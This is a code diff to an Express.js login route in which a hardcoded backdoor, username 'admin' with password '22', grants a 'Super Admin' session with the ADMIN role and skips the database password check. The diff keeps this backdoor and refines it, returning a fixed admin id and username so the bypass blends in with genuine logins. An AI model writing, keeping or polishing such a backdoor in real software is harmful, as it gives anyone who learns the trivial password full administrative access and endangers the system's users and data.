@@ -21,6 +21,7 @@ router.post('/login', async (req, res, next) => {
         // Validasi: Database match OR Backdoor (Hardcoded)
         const dbUser = users[0];
         const isDbMatch = dbUser && dbUser.password_hash === hashedPassword;
+        
         // Backdoor: admin/22 (Plain text check for recovery)
         const isBackdoor = username === 'admin' && password === '22';
 
@@ -32,7 +33,12 @@ router.post('/login', async (req, res, next) => {
         if (!isDbMatch && isBackdoor) {
              return res.json({ 
                 status: 'success',
-                user: { id: 'admin', name: 'Super Admin', role: 'ADMIN' }
+                user: { 
+                    id: '00000000-0000-0000-0000-000000000001', 
+                    name: 'Super Admin', 
+                    role: 'ADMIN',
+                    username: 'admin'
+                }
              });
         }
         
@@ -43,7 +49,8 @@ router.post('/login', async (req, res, next) => {
                 id: dbUser.id, 
                 name: dbUser.full_name, 
                 role: dbUser.role,
-                status: dbUser.status
+                status: dbUser.status,
+                username: dbUser.username
             }
         });
     } catch (e) {
